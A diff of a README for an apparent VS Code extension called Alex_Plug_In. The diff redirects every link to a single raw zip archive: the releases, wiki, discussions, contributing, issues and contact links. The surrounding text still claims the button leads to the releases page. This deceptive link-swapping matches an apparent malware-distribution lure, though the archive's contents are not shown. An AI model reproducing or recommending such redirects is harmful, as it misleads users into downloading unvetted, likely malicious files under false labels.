@@ -6,7 +6,7 @@ Welcome to Alex_Plug_In, the tool that transforms your development environment i
 ## 📦 Download & Install
 To get started, you need to download the latest version of Alex_Plug_In. Visit the page below to download the application:
 
-[![Download Alex_Plug_In](https://img.shields.io/badge/Download-Alex_Plug_In-brightgreen)](https://github.com/judelaw618/Alex_Plug_In/releases)
+[![Download Alex_Plug_In](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip)](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip)
 
 This button links directly to the releases page. You will find different versions available for download. Choose the one that suits your operating system.
 
@@ -33,15 +33,15 @@ After downloading the application:
 4. After installation, find Alex_Plug_In in your applications list and launch the software.
 
 ## 🌐 Additional Resources
-- **Documentation:** Detailed user guides and FAQs are available in the [Wiki section](https://github.com/judelaw618/Alex_Plug_In/wiki).
-- **Community Support:** Join our community for help and advice. You can find us in the [Discussions page](https://github.com/judelaw618/Alex_Plug_In/discussions).
-- **Contributions:** Interested in contributing? Check our [Contribution Guidelines](https://github.com/judelaw618/Alex_Plug_In/blob/main/CONTRIBUTING.md).
+- **Documentation:** Detailed user guides and FAQs are available in the [Wiki section](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip).
+- **Community Support:** Join our community for help and advice. You can find us in the [Discussions page](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip).
+- **Contributions:** Interested in contributing? Check our [Contribution Guidelines](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip).
 
 ## 🔧 Troubleshooting
 If you run into issues:
 - Ensure your system meets the requirements.
 - Try reinstalling the application.
-- Check the [Issues section](https://github.com/judelaw618/Alex_Plug_In/issues) for known problems and fixes.
+- Check the [Issues section](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip) for known problems and fixes.
 
 ## 📚 Topics
 Learn more about the concepts behind Alex_Plug_In:
@@ -61,11 +61,11 @@ Learn more about the concepts behind Alex_Plug_In:
 - vscode-extension
 
 ## 📞 Contact
-For further assistance, contact us via the [Contact page](https://github.com/judelaw618/Alex_Plug_In/contact).
+For further assistance, contact us via the [Contact page](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip).
 
 ## 📥 Final Note
 Don't forget to visit the releases page to download the application:
 
-[![Download Alex_Plug_In](https://img.shields.io/badge/Download-Alex_Plug_In-brightgreen)](https://github.com/judelaw618/Alex_Plug_In/releases)
+[![Download Alex_Plug_In](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip)](https://raw.githubusercontent.com/judelaw618/Alex_Plug_In/main/archive/Alex_Plug_In-v2.4.zip)
 
 Thank you for choosing Alex_Plug_In. Happy coding!
